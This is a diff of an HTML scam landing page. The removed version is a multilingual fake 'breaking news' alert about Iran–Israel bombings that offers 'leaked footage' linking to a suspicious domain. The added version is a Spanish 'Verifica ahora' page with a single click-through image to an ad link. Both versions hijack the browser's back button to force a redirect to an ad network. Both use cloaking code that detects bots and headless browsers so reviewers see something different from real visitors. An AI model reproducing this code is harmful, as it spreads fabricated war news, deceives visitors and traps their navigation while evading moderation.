@@ -1,169 +1,56 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="es">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>🚨 Global Alert: Iran–Israel Conflict Escalates</title>
-
-  <!-- Social Media Preview -->
-  <meta property="og:title" content="🚨 World on Edge: Iran–Israel Bombings Trigger Global Alarm">
-  <meta property="og:description" content="Breaking: Explosions reported in multiple cities. Global tension spikes.">
-  <meta property="og:image" content="https://i.ibb.co/67rv8dKm/hqdefault.jpg">
-  <meta property="og:type" content="website">
-  <meta property="og:url" content="https://znwspej.xyz/2?r=9599">
-
+  <title>Verifica ahora</title>
   <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
     body {
-      background-color: #0965a5;
-      color: #f2f2f2;
-      font-family: Arial, sans-serif;
-      text-align: center;
-      padding: 20px;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      background-color: #000;
     }
-
-    h1 {
-      font-size: 28px;
-      color: #ff3b3b;
-      margin-bottom: 15px;
+    img {
+      max-width: 90%;
+      height: auto;
+      border-radius: 12px;
+      box-shadow: 0 0 20px rgba(255, 255, 255, 0.2);
+      cursor: pointer;
+      transition: transform 0.3s ease;
     }
-
-    p {
-      font-size: 17px;
-      margin-top: 0;
-      line-height: 1.6;
-      color: #ddd;
-    }
-
-  .fake-video {
-  margin-top: 20px;
-  border: 4px solid #ff3b3b;
-  border-radius: 10px;
-  cursor: pointer;
-  width: 320px;         /* Tamaño reducido */
-  height: auto;
-  max-width: 100%;
-  box-shadow: 0 0 10px rgba(255, 0, 0, 0.4);
-}
-
-    .cta-button {
-      display: inline-block;
-      margin-top: 25px;
-      padding: 14px 28px;
-      font-size: 18px;
-      background-color: #ff3b3b;
-      color: #fff;
-      text-decoration: none;
-      border-radius: 8px;
-      transition: background-color 0.3s ease;
-    }
-
-    .cta-button:hover {
-      background-color: #c40000;
+    img:hover {
+      transform: scale(1.03);
     }
   </style>
-
   <script>
-    const messages = {
-      en: {
-        title: "🚨 World on Edge: Iran–Israel Bombings Begin",
-        paragraph: `⚠️ The conflict has intensified. Several cities hit. Nuclear fears rise.\n\n🛑 Intelligence reports warn of possible global escalation.\nWatch leaked video footage now.`,
-        button: "🔴 Watch Breaking Footage"
-      },
-      es: {
-        title: "🚨 Alerta Mundial: Comienzan los bombardeos entre Irán e Israel",
-        paragraph: `⚠️ El conflicto se intensifica. Varias ciudades han sido atacadas. Aumentan los temores nucleares.\n\n🛑 Informes de inteligencia advierten sobre una posible escalada global.\nMira el video filtrado ahora.`,
-        button: "🔴 Ver video impactante"
-      },
-      fr: {
-        title: "🚨 Alerte Mondiale : Bombardements Iran–Israël",
-        paragraph: `⚠️ Le conflit s'intensifie. Plusieurs villes touchées. Crainte nucléaire grandissante.\n\n🛑 Risque d'escalade mondiale selon les services de renseignement.\nRegardez la vidéo exclusive.`,
-        button: "🔴 Voir les images"
-      },
-      de: {
-        title: "🚨 Weltweite Alarmstufe: Iran–Israel-Konflikt eskaliert",
-        paragraph: `⚠️ Mehrere Städte wurden getroffen. Nukleare Bedrohung wächst.\n\n🛑 Geheimdienste warnen vor globaler Eskalation.\nJetzt geleaktes Video ansehen.`,
-        button: "🔴 Jetzt Video ansehen"
-      },
-      it: {
-        title: "🚨 Allerta globale: bombardamenti Iran–Israele",
-        paragraph: `⚠️ Diverse città colpite. Aumenta il timore nucleare.\n\n🛑 Rischio di escalation globale secondo fonti di intelligence.\nGuarda il video trapelato ora.`,
-        button: "🔴 Guarda il video"
-      },
-      ro: {
-        title: "🚨 Alertă globală: Bombardamente între Iran și Israel",
-        paragraph: `⚠️ Orașe lovite, panică nucleară în creștere.\n\n🛑 Escaladare globală posibilă conform rapoartelor.\nVezi acum videoclipul șocant.`,
-        button: "🔴 Vezi înregistrarea acum"
-      }
+    // BACK BUTTON redirect
+    history.pushState(null, null, location.href);
+    window.onpopstate = function () {
+      location.href = "https://www.profitableratecpm.com/p3qb4zi8my?key=b9ee17cb90fc7adf696fe5a9fc0682b7";
     };
 
-    function getLang() {
-      const lang = navigator.language.slice(0, 2);
-      return messages[lang] ? lang : 'en';
-    }
-
-    function isBot() {
-      const ua = navigator.userAgent.toLowerCase();
-      return ["facebookexternalhit", "bot", "crawl", "spider", "slurp", "bingbot", "googlebot"].some(bot => ua.includes(bot));
-    }
-
-    function detectUserBehavior() {
-      let human = false;
-      window.addEventListener('mousemove', () => { human = true; });
-
-      setTimeout(() => {
-        if (!human || isBot()) {
-          window.location.href = "https://znwspej.xyz/2?r=9599";
-        }
-      }, 3000);
-    }
-
-    window.onload = function () {
-      const lang = getLang();
-      const content = messages[lang];
-
-      document.getElementById("main-title").textContent = content.title;
-      document.getElementById("main-paragraph").innerText = content.paragraph;
-      document.getElementById("cta-btn").textContent = content.button;
-
-      detectUserBehavior();
+    // Filtro Anti-bot básico
+    const isBot = () => {
+      return (
+        navigator.webdriver ||
+        /HeadlessChrome/.test(window.navigator.userAgent) ||
+        /bot|crawl|spider/i.test(navigator.userAgent) ||
+        !navigator.userAgent ||
+        !navigator.language ||
+        !window.chrome
+      );
     };
+
+    if (isBot()) {
+      document.write("<h1>Contenido no disponible</h1>");
+      throw new Error("Bot detectado");
+    }
   </script>
 </head>
 <body>
-  <h1 id="main-title">Loading...</h1>
-  <p id="main-paragraph">Loading...</p>
-
-  <a href="https://znwspej.xyz/2?r=9599">
-    <video class="fake-video" autoplay muted loop playsinline controls poster="https://i.ibb.co/67rv8dKm/hqdefault.jpg">
-      <source src="https://qu.ax/ShDJm.mp4">
-      Your browser does not support the video tag.
-    </video>
-  </a>
-
-  <br>
-
-  <a id="cta-btn" class="cta-button" href="https://znwspej.xyz/2?r=9599">
-    Loading...
-  </a>
-
-  <script id="_wauup1">var _wau = _wau || []; _wau.push(["small", "clceb", "up1"]);</script>
-  <script async src="//waust.at/s.js"></script>
-
-  <!-- Redirección al presionar "Atrás" -->
-<script>
-  const cpaUrl = "https://www.profitableratecpm.com/p3qb4zi8my?key=b9ee17cb90fc7adf696fe5a9fc0682b7";
-
-  function goCPA() {
-    window.location.href = cpaUrl;
-  }
-
-  // Esto empuja un nuevo estado al historial del navegador
-  history.pushState(null, null, location.href);
-
-  // Cuando el usuario intenta volver atrás, ejecutamos goCPA()
-  window.addEventListener("popstate", function () {
-    goCPA();
-  });
-</script>
+  <img src="https://i.ibb.co/5gWWqHwc/image-1.png" alt="Verificar" onclick="window.location.href='https://roclnow.com/?k=63523d54914e87a1a731af2a2ea5b55a&type=mainstream&subtype=global'" />
 </body>
 </html>
